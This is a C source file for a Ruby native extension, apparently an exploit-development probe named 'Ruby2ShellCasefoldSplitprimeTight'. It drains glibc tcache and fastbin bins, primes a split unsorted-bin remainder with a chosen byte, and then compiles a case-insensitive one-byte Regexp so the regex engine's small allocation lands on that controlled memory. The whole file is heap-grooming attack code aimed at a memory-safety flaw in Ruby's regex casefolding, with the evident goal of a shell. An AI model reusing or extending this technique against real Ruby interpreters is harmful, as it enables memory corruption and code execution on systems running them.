/* Analysis-only probe: same split-unsorted-remainder prime, but Regexp
 * compilation happens in C immediately after the split with small malloc
 * bins pre-drained, so reg->exact's 1-byte allocation has the shortest
 * possible path to the primed remainder. No wire, app, marker or debugger
 * writes. */
#include "ruby.h"
#include <stdlib.h>
#include <string.h>

#include "ruby/encoding.h"

char *splitprime_tight_g_big;
char *splitprime_tight_g_front;
static void *drained[64 * 7];

static int
utf8_encode(unsigned int cp, char *out)
{
    if (cp < 0x80) { out[0] = (char)cp; return 1; }
    if (cp < 0x800) {
        out[0] = (char)(0xc0 | (cp >> 6));
        out[1] = (char)(0x80 | (cp & 0x3f));
        return 2;
    }
    out[0] = (char)(0xe0 | (cp >> 12));
    out[1] = (char)(0x80 | ((cp >> 6) & 0x3f));
    out[2] = (char)(0x80 | (cp & 0x3f));
    return 3;
}

static VALUE
splitprime_tight_try(VALUE self, VALUE byte_value, VALUE biglen_value,
                     VALUE frontlen_value, VALUE needle_value, VALUE cp_value)
{
    unsigned int byte = NUM2UINT(byte_value);
    size_t biglen = (size_t)NUM2ULONG(biglen_value);
    size_t frontlen = (size_t)NUM2ULONG(frontlen_value);
    unsigned int needle = NUM2UINT(needle_value);
    unsigned int cp = NUM2UINT(cp_value);
    size_t i, k, nd = 0;

    if (biglen < 0x100 || frontlen < 0x20 || frontlen + 0x40 > biglen)
        rb_raise(rb_eArgError, "bad lengths");

    /* Drain tcache/fastbin small bins before priming: hold every chunk. */
    for (k = 0; k < 7; k++)
        for (i = 0; i < 64; i++)
            drained[nd++] = malloc(0x18 + 0x10 * k);

    splitprime_tight_g_big = malloc(biglen);
    if (!splitprime_tight_g_big) rb_raise(rb_eNoMemError, "malloc");
    memset(splitprime_tight_g_big, (int)byte, biglen);
    free(splitprime_tight_g_big);                 /* unsorted */
    splitprime_tight_g_front = malloc(frontlen);  /* front split, remainder primed */
    if (!splitprime_tight_g_front) rb_raise(rb_eNoMemError, "malloc");

    {
        char pat = (char)needle;
        char text[4];
        int len = utf8_encode(cp, text);
        VALUE re = rb_reg_new_str(rb_enc_str_new(&pat, 1, rb_enc_find("US-ASCII")), 1);
        VALUE str = rb_enc_str_new(text, len, rb_enc_find("UTF-8"));
        return rb_funcall(re, rb_intern("match?"), 1, str);
    }
}

void
Init_ruby2shell_casefold_splitprime_tight(void)
{
    VALUE mod = rb_define_module("Ruby2ShellCasefoldSplitprimeTight");
    rb_define_singleton_method(mod, "try", splitprime_tight_try, 5);
}
